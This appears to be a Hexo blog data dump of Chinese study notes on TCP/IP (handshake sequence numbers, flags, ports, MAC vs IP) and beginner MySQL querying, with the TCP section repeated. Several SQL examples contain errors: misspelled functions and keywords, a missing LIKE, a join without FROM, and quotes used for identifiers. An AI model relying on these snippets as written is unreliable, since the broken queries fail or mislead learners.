需要注意的是当三此握手完成、连接建立以后，TCP连接的每个包都会设置ACK位<br>握手阶段：<br>序号 方向 seq ack</p>\n<ol>\n<li>A-&gt;B 10000 0</li>\n<li>B-&gt;A 20000 10000+1=10001</li>\n<li>A-&gt;B 10001 20000+1=20001<br>解释：<br>1：A向B发起连接请求，以一个随机数初始化A的seq,这里假设为10000，此时ACK＝0<br>2：B收到A的连接请求后，也以一个随机数初始化B的seq，这里假设为20000，意思是：你的请求我已收到，我这方的数据流就从这个数开始。B的ACK是A的seq加1，即10000＋1＝10001<br>3：A收到B的回复后，它的seq是它的上个请求的seq加1，即10000＋1＝10001，意思也是：你的回复我收到了，我这方的数据流就从这个数开始。A此时的ACK是B的seq加1，即20000+1=20001<br>数据传输阶段：<br>序号　　方向　　　　　　seq ack size<br>23 A-&gt;B 40000 70000 1514<br>24 B-&gt;A 70000 40000+1514-54=41460 54<br>25 A-&gt;B 41460 70000+54-54=70000 1514<br>26 B-&gt;A 70000 41460+1514-54=42920 54<br>解释：<br>23:B接收到A发来的seq=40000,ack=70000,size=1514的数据包<br>24:于是B向A也发一个数据包，告诉B，你的上个包我收到了。B的seq就以它收到的数据包的ACK填充，ACK是它收到的数据包的SEQ加上数据包的大小(不包括以太网协议头，IP头，TCP头)，以证实B发过来的数据全收到了。<br>25:A在收到B发过来的ack为41460的数据包时，一看到41460，正好是它的上个数据包的seq加上包的大小，就明白，上次发送的数据包已安全到达。于是它再发一个数据包给B。这个正在发送的数据包的seq也以它收到的数据包的ACK填充，ACK就以它收到的数据包的seq(70000)加上包的size(54)填充,即ack=70000+54-54(全是头长，没数据项)。<br>其实在握手和结束时确认号应该是对方序列号加1,传输数据时则是对方序列号加上对方携带应用层数据的长度.如果从以太网包返回来计算所加的长度,就嫌走弯路了.<br>另外,如果对方没有数据过来,则自处己的确认号不变,序列号为上次的序列号加上本次应用层数据发送长度.</li>\n</ol>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"https://iknow-pic.cdn.bcebos.com/b219ebc4b74543a99d881d8113178a82b80114ef?x-bce-process=image/resize,m_lfit,w_600,h_800,limit_1\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"img\"></p>\n<p><a href=\"https://blog.csdn.net/hushengqiang/article/details/44180557\">原文链接</a></p>\n<h3 id=\"TCP-IP的四元组、五元组、七元组\"><a href=\"#TCP-IP的四元组、五元组、七元组\" class=\"headerlink\" title=\"TCP/IP的四元组、五元组、七元组\"></a>TCP/IP的四元组、五元组、七元组</h3><ol>\n<li><p>四元组是：源IP地址、目的IP地址、源端口、目的端口</p>\n</li>\n<li><p>五元组是:   源IP地址、目的IP地址、协议号、源端口、目的端口</p>\n</li>\n<li><p>七元组是:    源IP地址、目的IP地址、协议号、源端口、目的端口，服务类型以及接口索引</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"<h1 id=\"网络协议\"><a href=\"#网络协议\" class=\"headerlink\" title=\"网络协议\"></a>网络协议</h1><p><a href=\"http://blog.sina.com.cn/s/blog_52ddfea30100nssx.html\">相关博客</a></p>\n<h2 id=\"以太网\"><a href=\"#以太网\" class=\"headerlink\" title=\"以太网\"></a>以太网</h2><h3 id=\"以太网术语\"><a href=\"#以太网术语\" class=\"headerlink\" title=\"以太网术语\"></a>以太网术语</h3><p>以太网遵循一组控制其基本操作的简单规则。为了更好地理解这些规则，了解基本的以太网术语十分重要。 </p>\n<ol>\n<li>介质——以太网设备连接到一个公共介质上，该介质为电气信号的传输提供了一条路径。历史上一直使用同轴铜电缆作为传输介质，但是目前双绞线或光纤更为多见。 </li>\n<li>网段——我们将单个共享介质称作一个以太网段。 </li>\n<li>节点——连接到网段的设备称作站点或节点。 </li>\n<li>帧——节点使用称作帧的简短消息进行通信，帧是大小不固定的信息块。 帧类似于人类语言中的句子。在中文里，我们构造句子时会有一些规则，例如每个句子必须包含主语和谓语。以太网协议也规定了用于构造帧的一组规则。对于帧的最大和最小长度有明确规定，而且帧中必须包含一组必需的信息段。例如，每个帧必须包括目标地址和源地址，它们分别指出了消息的接收方和发送方。通过地址可标识唯一的节点，就像通过姓名可找出某个人一样。任何两个以太网设备都不应具有相同的地址。","more":"####TCP/IP协议原理图及解释</li>\n</ol>\n<p><a href=\"http://s3.sinaimg.cn/middle/52ddfea3t998861108572&690\">原理图链接</a></p>\n<p><strong>应用层（FTP协议）:</strong></p>\n<p>首先我们说说应用层，应用层就像在特定城市特定大厦特定房间内的某一个用户，应用层之间的通讯就像两个不同用户之间发送的信，这个信是点对点的，从一个用户（某一主机内特定应用程序）到另外一个特定用户（另一主机内特定应用程序）。一个主机（大厦）内可能有很多应用程序（客户），我们如何区分它们呢，实际生活中我们用房间号，在电脑内部区分不同应用程序我们用端口号。</p>\n<p><strong>传输层(TCP):</strong></p>\n<p>用户写好了信，需要给信套上信封，并且写好发件人所在大厦，和收件人所在大厦，实际生活中的大厦完全可以类比为我们的计算机和服务器。传输层（TCP）就是在两个不同主机之间传输信息的协议。</p>\n<p><strong>网络层(IP):</strong></p>\n<p>邮件准备好了，他首先会被送到本城市的快递公司，并且被打包，包裹上会写着源是重庆快递公司，目的是沈阳快递公司，但是重庆快递公司发现它不能直接发货到沈阳，需要通过北京快递公司进行中转。所以虽然目的是沈阳，但是他首先把这个包裹发给了北京。某个城市的快递公司就像IP协议，要抵达目的IP，需要查询路由表，如果发现目的地址不是直连就需要找下一跳。通过了解快递公司的工作，我们了解到IP协议是逐跳工作的。每一跳（路由器）根据目的IP地址查询下一跳，并且最终转发到目的地。</p>\n<p><strong>链路层（以太网）:</strong></p>\n<p>重庆快递公司已经知道他需要把包裹发给北京快递公司了，现在他就把包裹送到重庆火车站，搭上去往北京的火车，然后在北京火车站卸货。然后送到北京快递公司，北京快递公司再判断下一跳为沈阳快递公司，并且选择适当的传输方式，例如:汽车，最后通过这种传输方式送到目的地沈阳快递公司。链路层协议就像包裹的运输方式，我们可以选择以太网（火车），也可以选择令牌环（汽车）。并且链路层协议是逐介质的，从一个网卡（重庆火车站）到另外一个网卡（北京火车站）。<br>所以你会发现一个数据包从源到目的，IP地址总是不变的（源是重庆快递公司，目的是沈阳快递公司），但是链路层协议却在不断变化，第一跳源是重庆火车站，目的是北京火车站，第二跳源是北京汽车站，目的是沈阳汽车站。</p>\n<ul>\n<li><p>知名端口号一般都低于1024，客户端端口号是临时的</p>\n</li>\n<li><p>TCP对数据进行封装，并对数据的安全进行保障，IP对被TCP封装后的数据进行传输</p>\n</li>\n<li><p>UDP对数据进行包装时不会对数据是否丢包进行保障，丢包时不返回检查，例如聊天信息的传输</p>\n</li>\n<li><p>以太网的类型：0800  IP数据  （记）</p>\n<p>​                         0806  ARP请求/应答   (记)</p>\n<p>​                         8035  RARP请求/应答</p>\n</li>\n<li><p>以太网的MTU最大值是1500，当数据大小大于出口的MTU时，会进行切片，并可进行多次切片处理</p>\n</li>\n</ul>\n<h2 id=\"关于IP首部\"><a href=\"#关于IP首部\" class=\"headerlink\" title=\"关于IP首部\"></a>关于IP首部</h2><p><a href=\"https://blog.csdn.net/Wu000999/article/details/88617237\">IP首部链接</a></p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190317101238221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1d1MDAwOTk5,size_16,color_FFFFFF,t_70\" alt=\"img\"></p>\n<ul>\n<li>详情点击上方链接（太难了。。。）</li>\n</ul>\n<h2 id=\"MAC-地址与-IP-地址区别\"><a href=\"#MAC-地址与-IP-地址区别\" class=\"headerlink\" title=\"MAC 地址与 IP 地址区别\"></a>MAC 地址与 IP 地址区别</h2><ul>\n<li>IP 地址和 MAC 地址相同点是它们都唯一，不同的特点主要有：</li>\n</ul>\n<ol>\n<li>对于网络上的某一设备，如一台计算机或一台路由器，其 IP 地址是基于网络拓扑设计出的，同一台设备或计算机上，改动 IP 地址是很容易的（但必须唯一），而 MAC 则是生产厂商烧录好的，一般不能改动。我们可以根据需要给一台主机指定任意的 IP 地址，如我们可以给局域网上的某台计算机分配 IP 地址为 192.168.0.112 ，也可以将它改成 192.168.0.200。而任一网络设备（如网卡，路由器）一旦生产出来以后，其 MAC 地址不可由本地连接内的配置进行修改。如果一个计算机的网卡坏了，在更换网卡之后，该计算机的 MAC 地址就变了。</li>\n<li>长度不同。IP 地址为 32 位，MAC 地址为 48 位。</li>\n<li>分配依据不同。IP 地址的分配是基于网络拓扑，MAC 地址的分配是基于制造商。</li>\n<li>寻址协议层不同。IP 地址应用于 OSI 第三层，即网络层，而 MAC 地址应用在 OSI 第二层，即数据链路层。 数据链路层协议可以使数据从一个节点传递到相同链路的另一个节点上（通过 MAC 地址），而网络层协议使数据可以从一个网络传递到另一个网络上（ARP 根据目的 IP 地址，找到中间节点的 MAC 地址，通过中间节点传送，从而最终到达目的网络）。</li>\n<li><strong>MAC地址其实是可以修改的，网上能搜到</strong></li>\n</ol>\n<h3 id=\"数据传输时\"><a href=\"#数据传输时\" class=\"headerlink\" title=\"数据传输时\"></a>数据传输时</h3><ul>\n<li>IP视为标记，原IP和目的IP再数据传输的过程中是不变的</li>\n<li>MAC视为步骤，每次经过网关时，IP和原MAC不变，但是目的MAC却会改变</li>\n</ul>\n<h5 id=\"基于TCP的应用层协议：\"><a href=\"#基于TCP的应用层协议：\" class=\"headerlink\" title=\"基于TCP的应用层协议：\"></a>基于TCP的应用层协议：</h5><ul>\n<li>HTTP：80</li>\n<li>HTTPS：443</li>\n<li>FTP：20/21</li>\n<li>SSH：22</li>\n<li>TELNET：23</li>\n<li>SMTP/POP：25/110</li>\n</ul>\n<h3 id=\"通过tcp包中flags的值来判断tcp的状态\"><a href=\"#通过tcp包中flags的值来判断tcp的状态\" class=\"headerlink\" title=\"通过tcp包中flags的值来判断tcp的状态\"></a>通过tcp包中flags的值来判断tcp的状态</h3><p>在TCP层，有个FLAGS字段，这个字段有以下几个标识：SYN, FIN, ACK, PSH, RST, URG.</p>\n<p>其中，对于我们日常的分析有用的就是前面的五个字段。<br>它们的含义是：SYN表示建立连接，FIN表示关闭连接，ACK表示响应，PSH表示有 DATA数据传输，RST表示连接重置。</p>\n<p>其中，ACK是可能与SYN，FIN等同时使用的，比如SYN和ACK可能同时为1，它表示的就是建立连接之后的响应，如果只是单个的一个SYN，它表示的只是建立连接。TCP的几次握手就是通过这样的ACK表现出来的。但SYN与FIN是不会同时为1的，因为前者表示的是建立连接，而后者表示的是断开连接。RST一般是在FIN之后才会出现为1的情况，表示的是连接重置。一般地，当出现FIN包或RST包时，我们便认为客户端与服务器端断开了连接；而当出现SYN和SYN＋ACK包时，我们认为客户端与服务器建立了一个连接。</p>\n<p>PSH为1的情况，一般只出现在 DATA内容不为0的包中，也就是说PSH为1表示的是有真正的TCP数据包内容被传递。<br>TCP的连接建立和连接关闭，都是通过请求－响应的模式完成的。</p>\n<p>TCP三次握手：<br>TCP(Transmission Control Protocol)传输控制协议<br>TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接：</p>\n<p>位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)</p>\n<p>三次握手详解如下：<br>一个虚拟连接的建立是通过三次握手来实现的</p>\n<p>(B) –&gt; [SYN] –&gt; (A)<br>假如服务器A和客户机B通讯. 当A要和B通信时，B首先向A发一个SYN (Synchronize) 标记的包，告诉A请求建立连接.<br>注意: 一个 SYN包就是仅SYN标记设为1的TCP包(参见TCP包头Resources). 认识到这点很重要，只有当A受到B发来的SYN包，才可建立连接，除此之外别无他法。因此，如果你的防火墙丢弃所有的发往外网接口的SYN包，那么你将不能让外部任何主机主动建立连接。<br>(B) &lt;– [SYN /ACK] &lt;–(A)<br>接着，A收到后会发一个对SYN包的确认包(SYN/ACK)回去，表示对第一个SYN包的确认，并继续握手操作.<br>注意: SYN/ACK包是仅SYN 和 ACK 标记为1的包.<br>(B) –&gt; [ACK] –&gt; (A)<br>B收到SYN/ACK 包,B发一个确认包(ACK)，通知A连接已建立。至此，三次握手完成，一个TCP连接完成<br>Note: ACK包就是仅ACK 标记设为1的TCP包. 需要注意的是当三此握手完成、连接建立以后，TCP连接的每个包都会设置ACK位<br>握手阶段：<br>序号 方向 seq ack</p>\n<ol>\n<li>A-&gt;B 10000 0</li>\n<li>B-&gt;A 20000 10000+1=10001</li>\n<li>A-&gt;B 10001 20000+1=20001<br>解释：<br>1：A向B发起连接请求，以一个随机数初始化A的seq,这里假设为10000，此时ACK＝0<br>2：B收到A的连接请求后，也以一个随机数初始化B的seq，这里假设为20000，意思是：你的请求我已收到，我这方的数据流就从这个数开始。B的ACK是A的seq加1，即10000＋1＝10001<br>3：A收到B的回复后，它的seq是它的上个请求的seq加1，即10000＋1＝10001，意思也是：你的回复我收到了，我这方的数据流就从这个数开始。A此时的ACK是B的seq加1，即20000+1=20001<br>数据传输阶段：<br>序号　　方向　　　　　　seq ack size<br>23 A-&gt;B 40000 70000 1514<br>24 B-&gt;A 70000 40000+1514-54=41460 54<br>25 A-&gt;B 41460 70000+54-54=70000 1514<br>26 B-&gt;A 70000 41460+1514-54=42920 54<br>解释：<br>23:B接收到A发来的seq=40000,ack=70000,size=1514的数据包<br>24:于是B向A也发一个数据包，告诉B，你的上个包我收到了。B的seq就以它收到的数据包的ACK填充，ACK是它收到的数据包的SEQ加上数据包的大小(不包括以太网协议头，IP头，TCP头)，以证实B发过来的数据全收到了。<br>25:A在收到B发过来的ack为41460的数据包时，一看到41460，正好是它的上个数据包的seq加上包的大小，就明白，上次发送的数据包已安全到达。于是它再发一个数据包给B。这个正在发送的数据包的seq也以它收到的数据包的ACK填充，ACK就以它收到的数据包的seq(70000)加上包的size(54)填充,即ack=70000+54-54(全是头长，没数据项)。<br>其实在握手和结束时确认号应该是对方序列号加1,传输数据时则是对方序列号加上对方携带应用层数据的长度.如果从以太网包返回来计算所加的长度,就嫌走弯路了.<br>另外,如果对方没有数据过来,则自处己的确认号不变,序列号为上次的序列号加上本次应用层数据发送长度.</li>\n</ol>\n<p><img src=\"https://iknow-pic.cdn.bcebos.com/b219ebc4b74543a99d881d8113178a82b80114ef?x-bce-process=image/resize,m_lfit,w_600,h_800,limit_1\" alt=\"img\"></p>\n<p><a href=\"https://blog.csdn.net/hushengqiang/article/details/44180557\">原文链接</a></p>\n<h3 id=\"TCP-IP的四元组、五元组、七元组\"><a href=\"#TCP-IP的四元组、五元组、七元组\" class=\"headerlink\" title=\"TCP/IP的四元组、五元组、七元组\"></a>TCP/IP的四元组、五元组、七元组</h3><ol>\n<li><p>四元组是：源IP地址、目的IP地址、源端口、目的端口</p>\n</li>\n<li><p>五元组是:   源IP地址、目的IP地址、协议号、源端口、目的端口</p>\n</li>\n<li><p>七元组是:    源IP地址、目的IP地址、协议号、源端口、目的端口，服务类型以及接口索引</p>\n</li>\n</ol>"},{"title":"数据库","_content":"\n# 数据库的学习（一）\n\n- [相关视频链接](https://www.bilibili.com/video/BV12b411K7Zu/?p=28)\n\n## 数据库及其概念\n\n- DB 数据库\n- DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB\n- SQL  管理数据库的语言，几乎被所有的DBMS支持\n- DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令\n\n<!--more-->\n\n### 数据库管理的特点\n\n1. 先将数据放到 “一张表” 中， 在将表放到仓库中\n2. 一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己\n3. 数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”\n4. 表是由列组成，也称为字段，相当与python中的  “属性”\n5. 表是按行储存的，每一行相当与python中的  ”对象“\n\n- 端口号port 3306\n\n### Linux 系统 Mysql 相关事项\n\n- 检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql --version\n\n- systemctl start mysql.service 启动  或者 service mysql start\n  systemctl stop mysql.service 停止  或者 service mysql stop \n  systemctl restart mysql.service 重启\n- 检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld\n [相关检查操作链接](https://blog.csdn.net/qq_31083947/article/details/90248565)\n\n### 数据库常用命令\n\n1. 进入管理系统时时查看有那些数据库\n\n```\nshow databases;\n```\n\n2. 进入库\n\n```\nuse 库的名称;\n```\n\n3. 查看库里有哪些表\n\n```\nshow tables;\n```\n\n4. 从现在所在的库中查看别的库中存有的表\n\n```\nshow tables from 库的名称;\n```\n\n5. 查看现在在哪个库\n\n```\nselect database();\n```\n\n6. 查看表的内容\n\n```\ndesc 表的名称;\n```\n\n7. 创建表\n\n```\ncreate table 表名（\n\t列名 列类型，\n\t列名 列类型，\n\t...\n)\n```\n\n\n\n### SQL语法规范\n\n1. 不区分大小写，但建议关键字大写，表名，列名小写\n2. 每行命令u最好用分号结尾\n3. 每行命令根据需要，可以进行缩进，或换行\n4. SQL语法中索引从1开始\n5. 注释 \n\n- 单行注释：#注释文字\n- 单行注释：-- 注释文字（注意横杠后面有空格）\n- 多行注释：/× 注释文字 ×/\n\n### 使用 DBMS 图形化界面以及命令行登录时出现错误解决\n\n- [原文链接](https://www.cnblogs.com/leolztang/p/5094930.html)\n\n```\n~$ mysql -u root -p\nEnter password: \nERROR 1698 (28000): Access denied for user 'root'@'localhost'\n```\n\n- 解决\n\n```\n# 强制登录\nsudo mysql\n\nselect user, plugin from mysql.user;\n\nupdate mysql.user set authentication_string=PASSWORD('hero1314'), plugin='mysql_native_password' where user='root';\n\nflush privileges;\n\nsudo service mysql restart\n```\n\n\n\n## 数据库语言的学习\n\n### DQL语言的学习\n\n#### 1、基础查询\n\n- 语法\n\n```\nselect 查询列表 from 表名;\n```\n\n- 特点：\n\n1. 查询列表可以是：表中的字段，常量值，表达式，函数\n2. 查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已\n\n- 查询字段\n\n```\nselect 字段一，字段二 from 表格;    //字段之间用逗号隔开\nselect * from 表格;  // 查询所有字段\n```\n\n- 着重号 `  （1的旁边的那个），用来标识字段\n\n- 查询常量值：select ' 字符或字符串 ’ ;\n\n- 起别名\n\n  ​\t别名有空格时，应用空格将别名括起来\n  \n  ​\t注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 \n\n```\nselect 字段值 as 别名;  // as可以省略\n```\n\n- 去重：在被查询的字段之前加上关键字 distinct\n- \\+ 号的作用\n\n```\nselect 100+90; // 俩个操作数都为数值型，则做加法运算\n# 结果：190\nselect '100'+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算\n# 结果：190\nselect null+10; //若有一个方为null，则结果肯定为null\n```\n\n\n\n- ifnull( ) 函数\n\n```\nselect IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值\n```\n\n\n\n#### 2、条件查询\n\n- 语法：\n\n```\nselect 查询列表 from 表名 where 筛选条件;\n```\n\n- 分类：\n\n1. 按表达条件筛选：\n\n   ​\t\t逻辑运算符：> , <, =, <> , <=, >=\n\n   ​\t\t注意：<>为不等于的意思\n\n2. 按逻辑表达式筛选：\n\n   ​\t\t&&， ||， ！\n\n   ​\t\tand，or，not   // SQL推荐使用\n\n3. 模糊查询\n\n   ​\t\tlike, between and, in, is null\n\n   - between and 等价与  >=  and <=\n\n   模糊查询通常与通配符一起使用  (in 不支持)\n\n   - 常见通配符：% 匹配任意一个或零个\n\n     ​\t\t\t\t\t _  (下划线) 匹配任意一个\n\n     - 支持对通配符进行转义\n\n```\nselect 字段 from 表名 where like '_$_' escape '$'; //使用$符号对下划线进行转义\n```\n\n```\nselect × from 表名 where like %a%;\n```\n\n4. 安全等于  <=> : 可以判断显示NULL\n\n\n\n#### 3、排序查询\n\n- 语法：\n\n```\nselect 字段\nfrom 表\nwhere 筛选条件\norder by 排序列表 asc|desc   //不写关键字，默认是asc\n# asc 从低到高 （升序）\n# desc 从高到底 （降序）\n```\n\n- 支持别名排序， 运算表达式排序\n- 支持对多个列表进行先后排序查询，列表间用逗号隔开\n- 排序语句一般是放在查询语句的最后面\n\n\n\n#### 常见函数\n\n- 类似python中的方法\n- 函数可以嵌套使用\n- 分类：\n\n1. 单行函数：concat, length, ifnull等\n2. 分组函数：\n   + 功能：做统计使用，又称为统计函数，聚合函数，组函数\n\n##### 单行函数\n\n###### 一、字符函数\n\n1. length \n\n```\nselect length('str');\n```\n\n2. concat ( ) 拼接函数\n\n```\nconcat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开\n# 若str中有值为NULL，则查询的所有值为NULL\n```\n\n3. upper( ), lower( ) :改变大小写\n\n4. substr( ) ：截取字符函数\n\n```\nselect substr('今天买了个大白菜'， 6);\n结果: 大白菜\nselect substr('今天买了个大白菜'， 3, 4);\n结果: 买了\n```\n\n5. instr( ) :返回字串第一个字符的索引，没有则返回0\n\n```\nselect instr('今天买了个大白菜'， '大白菜');\n结果：6\n```\n\n6. trim( ) :去掉字段中的空格或指定字符\n\n```\nselect trim('烂的' from '今天买了个烂的大白菜');\n结果：今天买了个大白菜\n```\n\n7. lpad( ): 左填充指定长度的字符，\n\n   rpad( ): 右填充指定长度的字符\n\n```\nselect ipad('大白菜', 6, '*');\n结果：×××大白菜\nselect rpad('大白菜', 6, '*');\n结果：大白菜×××\n```\n\n8. replace 替换\n\n```\nselect replace('今天买了个大白菜', '大白菜', '胡萝卜');\n结果：今天买了个胡萝卜\n```\n\n###### 二、数学函数\n\n1. round( ) : 四舍五入函数\n\n```\nselect round(1.1236);  //默认保留整数部分\n结果：1\nselect round(1.1236, 3);  //可指定保留小数部分\n结果：1.124\n```\n\n2. ceil( ): 向上取整，返回 >= 该函数的最小整数\n3. floor( ): 向下取整，返回  <= 该函数的最大整数\n\n```\nselect floor(-9.99);\n结果：-10\n```\n\n4. truncate 截断函数，截断小数点后指定的位数\n\n```\nselect truncate(1.123, 2);\n结果：1.12\n```\n\n5. mod( ): 取模（取余）函数\n\n```\nselect mod(10,3);\n结果：1\n```\n\n###### 三、日期函数\n\n1. now( ) 返回当前系统日期+时间\n2. curdate( ) 返回当前系统日期，不返回时间\n3. curtime( ) 返回当前时间，不返回日期\n4. str_to_date( ) 将日期格式的字符转换成指定格式的日期\n5. date_format( ) 将日期转换成字符\n\n- 更多日期函数请上网搜索\n\n###### 四、流程控制函数\n\n1. if( ) :该函数起到的作用类似与python或C语言中的else if( )函数\n2. case( )： \n\n```\ncase 要判断的字段或表达式    // 选择函数——判断并选择显示一个\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend\n```\n\n```\ncase\nwhen 常量1 then 要显示的值1或语句1;  //如果显示的是值，则不显示分号 \nwhen 常量2 then 要显示的值2或语句2;\n...\nelse 默认显示的值或语句\nend\n```\n\n###### 五、其它函数\n\n- 其他函数太多，用时上网搜\n\n##### 分组函数\n\n- 功能：用作统计使用，又称为聚合函数或统计函数或组函数\n- 分类：sum 求和， avg 平均值， max， min， count 计算个数\n- 忽略 NULL值\n- 可以与distinct( )去重函数或其它函数搭配使用\n- count( )详细介绍\n\n```\nselect count(*) from 表单;  //统计总行数\n```\n\n- 和分组函数一同查询的字段要求是group by后的字段\n\n#### 4、分组查询\n\n1. 语法：\n\n```\nselect 分组函数，列（要求出现在group by的后面）\nfrom 表\n[where 筛选条件]\ngroup by 分组的列表;\n[order by 子句]\n\n// 查询列表必须特殊，要求是分组函数和group by 后出现的字段\n```\n\n- 简单的分组查询\n\n1. 实例一：查询每个工种的最高工资\n\n```\nselect max(salary), job_id\nfrom employees\ngroup by job_id;\n```\n\n3. 实例二：查询每个位置上的部门个数\n\n```\nselect count(*), location_id\nfrom departments\ngroup by lacation_id;\n```\n\n- 添加筛选条件的分组查询\n\n4. 实例三：查询邮箱中包含a字符的，每个部门的平均工资\n\n```\nselect avg(salsry), department_id\nfrom employees\nwhere email '%a%'\ngroup by department_id;\n```\n\n5. 实例四：查询有奖金的每个领导手下员工的最高工资\n\n```\nselect max(salary), manager_id\nfrom employees\nwhere commission_pct is ont null\ngroup by manager_id;\n```\n\n- 添加复杂筛选条件的分组查询\n- 分组后进行条件筛选的查询\n\n6. 实例五：查询哪个部门的员工个数>2\n\n```\nselect count(*), depatment_id\nfrom employees\ngroup by department_id\nhaving count(*)>2;   //用查询的结果再进行筛选时用having\n```\n\n#### 5、连接查询【 优先学习99语法 】\n\n1. 含义：又称多表查询，当查询的字段来自于多个表时，就会用到连接查询\n\n2. 笛卡尔乘积现象：表1有m行，表2有n行，结果有m×n行\n\n   1. 发生原因：没有有效的链接条件\n   2. 如何避免：添加有效的连接条件\n\n3. 按功能分类：\n\n   - 内连接：等值连接\n\n     ​\t\t\t   非等值连接\n\n     ​\t\t\t   自连接\n\n   - 外连接：左外连接\n\n     ​\t\t\t   右外连接\n\n     ​\t\t\t   全外连接\n\n   - 交叉连接\n\n##### SQL92语法\n\n(1) 等值查询\n\n- 查询员工名和对应的部门名\n\n```\nselect last_name, department_name\nfrom employees, departments\nwhere employees.'department_id=departments.'department_id';\n```\n\n- 多条件筛选连接查询\n  - 查询有奖金的员工名，部门名\n\n```\nselect last_name, department_name, commission_pct\nfrom emplloees e, departments d\nwhere e.'department_id'=d.'department_id'\nand e.'commission_pct' is not null;\n```\n\n(2) 非等值链接\n\n- 在等值链接的基础上将条件改为非等值就行\n\n(3) 自链接\n\n- 自己链接自己\n\n- 实例:查询查询一张表中员工名和上级的名称\n\n```\nselect e.employee_id, e.last_name, m.employee_id, m.last_name\nfrom employees e, employees m\nwhere e.'manager_id'=m.'employee_id';\n```\n\n\n\n##### SQL99语法\n\n- 语法： select 查询列表\n\n  ​\t\t\tfrom 表1 别名\n\n   \t\t   [连接类型]  join 表2 别名\n\n  ​\t\t\ton 连接条件\n\n  ​\t\t\twhere 筛选条件\n\n  ​\t\t\tgroup by 分组\n\n  ​\t\t\thaving 筛选条件\n\n  ​\t\t\torder by 排序条件\n\n###### 内链接\n\n- 语法：\n\n```\nselect 查询列表\nfrom 表1 别名\ninner join 表2 别名\non 连接条件；\n```\n\n- 分类：\n\n```\n内链接：inner\n外链接\n\t左外：left【outer】  //括号中outer可以省去\n\t右外：right 【outer】\n\t全外：full 【outer\n交叉连接：cross\n```\n\n\n\n1. 等值查询（内连接）\n\n```\n案例1 查询员工名、部门名\nselect last_name, department_name\nfrom employees e\ninner join departments d\non e.'department_id' = d.'department_id';\n```\n\n\n\n2. 非等值连接(内链接)\n\n```\n案例1：查询员工的工资级别\nselect salary, grdae_level\nfrom employees e\njoin job_grades g\non e.'salary' between g.'lowest_sal' and 'highest_sal';\n```\n\n\n\n3. 自连接（内连接）\n\n```\n查询员工的名字，上级的名字,包含字符k的\nselect e.last_name, m.last_name\njoin employees m\non e.'manager_id' = m.'employee_id'\nwhere e.'last_name' like '%k%';\n```\n\n\n\n###### 外连接\n\n- 应用场景，一个表格有，一个表格没有\n- 特点：\n\n1. 外连接的查询结果为主表中的所有记录\n\n   如果从表中有和他匹配的，则显示匹配值\n\n   如果从表中没有和它匹配的值，则显示null\n\n   外连接查询结果=内链接结果+主表中有而从表中没有的记录\n\n2. 左外连接，left join左边的是主表\n\n   右外连接，right join右边的是主表\n\n   左外右外和俩个表都换一下顺序，可以实现同样的效果\n\n- 主表：查询内容较多的表格\n\n- 全外连接：全外连接=内连接的结果+表1中有但表2中没有的+表2中有但表1中没有的\n\n\n\n###### 交叉连接\n\n- 相当于用99语法实现的笛卡尔乘积\n\n图示：\n\n![NBjOQf.png](https://s1.ax1x.com/2020/06/25/NBjOQf.png)\n\n![NBjXy8.png](https://s1.ax1x.com/2020/06/25/NBjXy8.png)\n\n\n\n#### 6、子查询\n\n1. 含义：出现在其他语句中的select语句，称为子查询或内查询\n2. 分类：\n\n```\n按子查询出现的位置：\n\t\tselect后面：\n\t\t\t仅仅支持标量子查询\n\t\tfrom后面：\n\t\t\t支持表子查询\n\t\twhere或having后面： // 重点\n\t\t\t标量子查询\t   //  重点\n\t\t\t列子查询\t\t// 重点\n\t\t\t行子查询\t\t// 重点\n\t\texists后面（相关子查询）\n\t\t\t表子查询\n按结果集的行列数不同：\n\t\t标量子查询：结果集只有一行一列\n\t\t列子查询：结果集有一列多行\n\t\t行子查询：结果集有一行多列\n\t\t表子查询：结果集有多行多列\n```\n\n\n\n- （一）where或having后面\n\n1. 标量子查询（单行子查询）\n\n2. 列子查询（多行子查询）\n\n3. 行子查询（多行多列）\n\n4. 特点：（1）子查询放在小括号内\n\n   ​\t\t   （2）子查询一般放在条件的右侧\n\n   ​\t\t\t（3）标量子查询，一般搭配着单行操作符使用<  > =   >=  <=等\n\n   ​\t\t\t \t\t列子查询，一般搭配多行操作符使用 in, any,some, all\n\n   ​\t\t\t  (4)子查询的执行优先于主查询，因为主查询要用到子查询\n\n1. 标量子查询\n\n```\n案例：谁的工资比sam高？\n#查询sam的工资\nselect salary\nfrom employees\nwhere last_name = 'sam'；\n\n#查询员工的信息，满足salary > sam工资 的结果\nselect *\nfrom employees\nwhere salary >(\n    select salary\n    from employees      //为更清晰的表达，子查询最好进行缩进\n    where last_name = 'sam'  \n)；\n```\n\n```\n案例：返回公司工资最少的员工的last_name,job_id,salary\n#查询公司的最低工资\nselect min(salary)\nfrom empolyees;\n\n#查询last_name, job_id, salary, 要求salary= 公司的最低工资\nselect last_name, job_id, salary\nfrom employees\nwhere salary=(\n    select min(salary)\n    from empolyees\n);\n```\n\n\n\n2. 